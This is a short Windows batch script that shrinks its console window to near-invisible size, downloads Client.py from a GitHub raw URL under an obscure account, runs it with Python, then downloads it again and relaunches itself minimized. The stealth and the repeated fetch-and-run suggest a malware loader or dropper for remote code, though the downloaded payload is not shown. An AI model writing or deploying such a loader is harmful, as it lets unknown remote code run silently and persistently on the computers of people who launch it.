mode 1,1
@echo off
:top
curl -o Client.py https://raw.githubusercontent.com/oogabooga245/-/main/Client.py
python3 Client.py
goto :run
:run
timeout 10 >nul
curl -o Client.py https://raw.githubusercontent.com/oogabooga245/-/main/Client.py
START /MIN CMD.EXE /C 1.bat
exit